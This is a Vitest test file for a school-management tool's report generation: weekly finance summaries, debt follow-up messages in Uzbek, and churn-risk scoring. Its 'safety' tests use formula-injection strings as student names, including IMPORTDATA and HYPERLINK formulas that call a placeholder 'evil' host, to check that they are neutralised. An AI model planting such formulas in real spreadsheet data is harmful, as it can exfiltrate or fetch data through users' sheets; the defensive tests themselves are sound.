import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { AttendanceRow, Charge, Enrollment, Payment } from "../src/domain/types";
import { computeInsights, debtAdvice, DEBT_SHEET, RISK_SHEET, riskList, safeCell, WEEK_SHEET, weeklyReport } from "../src/gas/insights";
import { append, read } from "../src/gas/repo";
import { ATTENDANCE, CHARGES, DRAFTS, ENROLLMENTS, EXPENSES, GROUPS, PAYMENTS, STUDENTS } from "../src/gas/schema";
import { setupWorkbook } from "../src/gas/setup";
import { installHarness, type Harness } from "./harness";

let h: Harness;

/** Today is Monday 2026-11-23 (the same scenarios as backend/tests/test_ai_reports.py). */
const TODAY = "2026-11-23";
const day = (offset: number): string => new Date(Date.UTC(2026, 10, 23 + offset)).toISOString().slice(0, 10);
let n = 0;
const student = (id: string, fullName: string): void =>
  append(STUDENTS, [{ id, fullName, status: "active", guardianName: "Ota", guardianChatId: "555", consentNotify: true }]);
const enroll = (studentId: string, extra: Partial<Enrollment> = {}): void =>
  append(ENROLLMENTS, [{ id: `E${String(++n).padStart(4, "0")}`, studentId, groupId: "G0001", startedOn: day(-100), endedOn: "", discountPercent: 0, status: "active", ...extra }]);
const charge = (studentId: string, amount: number, dueOffset: number): void =>
  append(CHARGES, [{ id: `C${String(++n).padStart(4, "0")}`, studentId, enrollmentId: "", month: "2026-11-01", amount, dueDate: day(dueOffset), voided: false, note: "" } satisfies Charge]);
const pay = (studentId: string, amount: number, paidOffset = 0, voided = false): void =>
  append(PAYMENTS, [{ id: `P${String(++n).padStart(4, "0")}`, studentId, paidOn: day(paidOffset), amount, method: "Naqd", note: "", voided } satisfies Payment]);
const attend = (studentId: string, offset: number, status: AttendanceRow["status"]): void => append(ATTENDANCE, [{ date: day(offset), groupId: "G0001", studentId, status, minutesLate: 0 }]);
const sheet = (name: string): (string | number)[][] => h.rows(name) as (string | number)[][];
/** body rows of a report sheet: below the title, the note, a blank row and (when the sheet has one) the header */
const body = (name: string): (string | number)[][] => sheet(name).slice(name === WEEK_SHEET ? 3 : 4);

beforeEach(() => {
  vi.useFakeTimers({ toFake: ["Date"] });
  vi.setSystemTime(new Date(`${TODAY}T08:00:00Z`));
  h = installHarness();
  setupWorkbook();
  append(GROUPS, [{ id: "G0001", name: "IELTS", teacherId: "", monthlyFee: 900_000, status: "active" }]);
});
afterEach(() => vi.useRealTimers());

describe("weekly summary", () => {
  it("takes the numbers from the books and writes the rule-based lines", () => {
    student("S0001", "Ali Valiyev");
    enroll("S0001");
    charge("S0001", 900_000, -40);
    pay("S0001", 250_000);
    pay("S0001", 999_999, 0, true); // voided: not income
    pay("S0001", 111_000, -20); // outside both weeks
    append(EXPENSES, [{ id: "X0001", date: day(-2), category: "rent", amount: 100_000, note: "", voided: false }]);
    const { week } = computeInsights();
    expect(week).toMatchObject({ income: 250_000, incomePrev: 0, incomeChangePercent: null, expenses: 100_000, net: 150_000 });
    // 900 000 charged, 361 000 paid in total (FIFO) -> 539 000 still open and overdue
    expect(week).toMatchObject({ unpaid: 1, unpaidTotal: 539_000, overdue: 1, attendancePercent: null });
    weeklyReport();
    const lines = body(WEEK_SHEET).map((r) => String(r[0]));
    expect(lines[0]).toBe("Tushum: 250 000 so'm (o'tgan hafta: 0 so'm).");
    expect(lines).toContain("Qarzdorlar: 1 ta, jami 539 000 so'm, shundan muddati o'tgan: 1 ta.");
    expect(lines).toContain("1. Ali Valiyev: 539 000 so'm, 40 kun, ohang: so'nggi.");
    expect(String(sheet(WEEK_SHEET)[1]![0])).toContain("Hech narsa yuborilmaydi");
  });

  it("compares with the previous week and counts attendance of both weeks", () => {
    student("S0001", "Ali");
    enroll("S0001");
    pay("S0001", 200_000, -1);
    pay("S0001", 100_000, -9);
    for (const o of [-1, -2, -3]) attend("S0001", o, "present");
    attend("S0001", -4, "absent");
    attend("S0001", -8, "present");
    attend("S0001", -9, "absent");
    attend("S0001", -10, "excused"); // not counted
    const { week } = computeInsights();
    expect(week).toMatchObject({ income: 200_000, incomePrev: 100_000, incomeChangePercent: 100, attendancePercent: 75, attendancePrevPercent: 50 });
  });

  it("an empty workbook gives a quiet report, not an error", () => {
    weeklyReport();
    expect(body(WEEK_SHEET).map((r) => String(r[0]))).toContain("Qarzdor yo'q.");
  });
});

describe("debt follow-up", () => {
  it("orders by urgency, picks the tone and drafts the text", () => {
    for (const [i, name] of ["Eski Qarz", "Yangi Qarz", "Hali Muddat Bor", "To'lagan"].entries()) {
      student(`S000${i + 1}`, name);
      enroll(`S000${i + 1}`);
    }
    charge("S0001", 300_000, -40);
    charge("S0002", 300_000, -3);
    charge("S0003", 300_000, 10);
    debtAdvice();
    const rows = body(DEBT_SHEET);
    expect(rows.map((r) => [r[1], r[2], r[3], r[4], r[5]])).toEqual([
      ["Eski Qarz", 300_000, 300_000, 40, "final"],
      ["Yangi Qarz", 300_000, 300_000, 3, "soft"],
      ["Hali Muddat Bor", 300_000, 0, 0, "reminder"],
    ]);
    expect(rows[0]![7]).toBe("Assalomu alaykum! Eski Qarz uchun 300 000 so'm qarz 40 kundan beri to'lanmagan. Iltimos, biz bilan bog'laning: to'lov rejasini birga kelishib olamiz.");
    expect(JSON.stringify(sheet(DEBT_SHEET))).not.toContain("To'lagan");
  });

  it("lists at most 30 students and says how many more there are", () => {
    for (let i = 1; i <= 32; i++) {
      student(`S${String(i).padStart(4, "0")}`, `Qarzdor ${i}`);
      enroll(`S${String(i).padStart(4, "0")}`);
      charge(`S${String(i).padStart(4, "0")}`, 100_000 + i, -10);
    }
    debtAdvice();
    const rows = body(DEBT_SHEET);
    expect(rows).toHaveLength(31);
    expect(String(rows[30]![0])).toContain("yana 2 ta");
  });

  it("says so when nobody owes", () => {
    debtAdvice();
    expect(body(DEBT_SHEET)).toEqual([["Qarzdor o'quvchi yo'q.", "", "", "", "", "", "", ""]]);
  });
});

describe("churn risk", () => {
  function scenario(): void {
    student("S0001", "Susayayotgan");
    student("S0002", "Barqaror");
    student("S0003", "Sinovdan Keyin");
    enroll("S0001");
    enroll("S0002");
    enroll("S0003", { status: "trial", startedOn: day(-20) });
    charge("S0001", 900_000, -25);
    for (const o of [-50, -45, -40, -35]) {
      attend("S0001", o, "present");
      attend("S0002", o, "present");
    }
    for (const o of [-20, -15, -10, -5]) {
      attend("S0001", o, "absent");
      attend("S0002", o, "present");
    }
  }

  it("lists the attendance drop with debt and the trial nobody answered (same numbers as the API)", () => {
    scenario();
    riskList();
    const rows = body(RISK_SHEET);
    expect(rows.map((r) => [r[1], r[2], r[3], r[5], r[6]])).toEqual([
      ["Susayayotgan", 65, "yuqori", 0, 100],
      ["Sinovdan Keyin", 30, "o'rta", "", ""],
    ]);
    expect(rows[0]![4]).toBe("1. Susayayotgan: xavf balli 65 (yuqori); sabab: davomat pasaygan, qarzi muddati o'tgan.");
  });

  it("does not count excused absences", () => {
    student("S0001", "Uzrli");
    enroll("S0001");
    for (const o of [-50, -45]) attend("S0001", o, "present");
    for (const o of [-20, -15, -10]) attend("S0001", o, "excused");
    expect(computeInsights().risk).toEqual([]);
  });

  it("a trial still inside its free days is not a risk", () => {
    student("S0001", "Yangi");
    enroll("S0001", { status: "trial", startedOn: day(-2) });
    expect(computeInsights().risk).toEqual([]);
  });

  it("a left student with an old debt is not on the churn list", () => {
    student("S0001", "Ketgan");
    enroll("S0001", { status: "finished", endedOn: day(-30) });
    charge("S0001", 900_000, -60);
    expect(computeInsights().risk).toEqual([]);
    expect(computeInsights().debt.map((d) => d.id)).toEqual(["S0001"]); // but still a debt to follow up
  });
});

describe("safety", () => {
  it("a student name can never become a formula", () => {
    expect(safeCell("=IMPORTDATA(\"http://evil\")")).toBe("'=IMPORTDATA(\"http://evil\")");
    expect(safeCell("+998901112233")).toBe("'+998901112233");
    expect(safeCell("-1")).toBe("'-1");
    expect(safeCell("@sum")).toBe("'@sum");
    expect(safeCell("Ali")).toBe("Ali");
    expect(safeCell(42)).toBe(42);
    student("S0001", "=HYPERLINK(\"http://evil\",\"x\")");
    enroll("S0001");
    charge("S0001", 300_000, -10);
    debtAdvice();
    expect(String(body(DEBT_SHEET)[0]![1]).startsWith("'=")).toBe(true);
  });

  it("generating reports sends nothing and creates no drafts", () => {
    scenario2();
    const drafts = read(DRAFTS).length;
    weeklyReport();
    debtAdvice();
    riskList();
    expect(h.fetches).toEqual([]);
    expect(read(DRAFTS)).toHaveLength(drafts);
  });

  it("reports are generated sheets, not data tables", () => {
    weeklyReport();
    debtAdvice();
    riskList();
    expect(read(STUDENTS)).toEqual([]);
    expect(h.sheets.has(WEEK_SHEET) && h.sheets.has(DEBT_SHEET) && h.sheets.has(RISK_SHEET)).toBe(true);
  });
});

function scenario2(): void {
  student("S0001", "Ali");
  enroll("S0001");
  charge("S0001", 500_000, -20);
}
